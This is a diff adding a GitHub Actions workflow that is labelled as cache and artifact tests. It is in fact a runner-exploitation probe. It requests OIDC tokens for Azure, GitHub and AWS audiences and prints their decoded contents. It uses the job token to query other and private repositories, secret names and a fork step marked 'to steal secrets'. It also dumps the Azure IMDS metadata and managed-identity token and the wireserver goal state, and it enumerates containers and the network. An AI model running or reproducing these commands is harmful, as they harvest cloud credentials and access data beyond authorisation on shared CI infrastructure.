@@ -1,0 +1,85 @@
+name: Cache and Artifact Tests
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+
+jobs:
+  test-vectors:
+    runs-on: ubuntu-latest
+    steps:
+      - name: OIDC Token Tests
+        run: |
+          echo "=== 1. OIDC Token Request ==="
+          echo "OIDC URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "OIDC Token var set: $([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo YES || echo NO)"
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" 2>&1)
+            echo "OIDC resp len: ${#OIDC}"
+            echo "$OIDC" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get("value",""); parts=t.split("."); import base64; header=base64.urlsafe_b64decode(parts[0]+"=="); payload=base64.urlsafe_b64decode(parts[1]+"=="); print("HEADER:",header.decode()); print("PAYLOAD:",payload.decode())" 2>&1
+            echo ""
+            echo "=== 1b. OIDC with GitHub audience ==="
+            OIDC2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://github.com" 2>&1)
+            echo "$OIDC2" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get("value",""); parts=t.split("."); import base64; payload=base64.urlsafe_b64decode(parts[1]+"=="); print(payload.decode())" 2>&1
+            echo ""
+            echo "=== 1c. OIDC with AWS audience ==="
+            OIDC3=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" 2>&1)
+            echo "$OIDC3" | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get("value",""); parts=t.split("."); import base64; payload=base64.urlsafe_b64decode(parts[1]+"=="); print(payload.decode())" 2>&1
+          fi
+          echo ""
+
+      - name: Actions API Tests
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== 2. List workflow runs from OTHER repos ==="
+          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/actions/runner/actions/runs?per_page=2" 2>&1 | head -20
+          echo ""
+          echo "=== 3. List artifacts from OTHER repos ==="
+          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/actions/runner/actions/artifacts?per_page=2" 2>&1 | head -20
+          echo ""
+          echo "=== 4. Access private repo via token ==="
+          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/test4100test-cloud/private-secret-test" 2>&1 | head -10
+          echo ""
+          echo "=== 5. List org repos ==="
+          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/installation/repositories?per_page=5" 2>&1 | head -20
+          echo ""
+          echo "=== 6. Token scopes ==="
+          curl -sI -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/test4100test-cloud/sec-test" 2>&1 | grep -iE "scope|rate|token" | head -10
+          echo ""
+          echo "=== 7. List actions secrets (names only) ==="
+          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/test4100test-cloud/sec-test/actions/secrets" 2>&1
+          echo ""
+          echo "=== 8. Create fork to steal secrets ==="
+          curl -sS -X POST -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/torvalds/linux/forks" -d "{"name":"test-fork"}" 2>&1 | head -10
+          echo ""
+
+      - name: Runner Infrastructure Tests
+        run: |
+          echo "=== 9. Azure IMDS full dump ==="
+          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>&1 | head -80
+          echo ""
+          echo "=== 10. Azure IMDS identity token ==="
+          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -5
+          echo ""
+          echo "=== 11. Wireserver goalstate ==="
+          curl -sS --connect-timeout 3 "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -30
+          echo ""
+          echo "=== 12. Check for other containers ==="
+          docker ps -a 2>&1
+          docker images 2>&1 | head -20
+          echo ""
+          echo "=== 13. Network interfaces ==="
+          ip addr show 2>&1 | head -30
+          echo ""
+          echo "=== 14. ARP table ==="
+          ip neigh show 2>&1 | head -20
+          echo ""
+          echo "=== 15. Routing table ==="
+          ip route show 2>&1 | head -20
+          echo ""
+          echo "=== Complete ==="
